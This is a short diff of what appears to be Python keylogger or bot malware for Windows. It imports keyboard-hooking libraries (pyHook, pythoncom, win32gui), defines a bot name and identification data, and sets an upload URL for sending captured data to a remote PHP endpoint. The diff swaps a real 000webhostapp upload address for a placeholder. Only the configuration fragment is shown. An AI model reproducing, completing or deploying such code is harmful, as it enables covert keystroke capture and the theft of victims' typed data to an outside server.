@@ -17,7 +17,7 @@ import requests
 import pythoncom, pyHook
 import win32gui
 
-uploadURL = 'http://monohydric-variatio.000webhostapp.com/upload.php'
+uploadURL = '<my website url>/upload.php'
 identification = {}
 botname = ''
 proxy = os.environ['HTTP_PROXY']
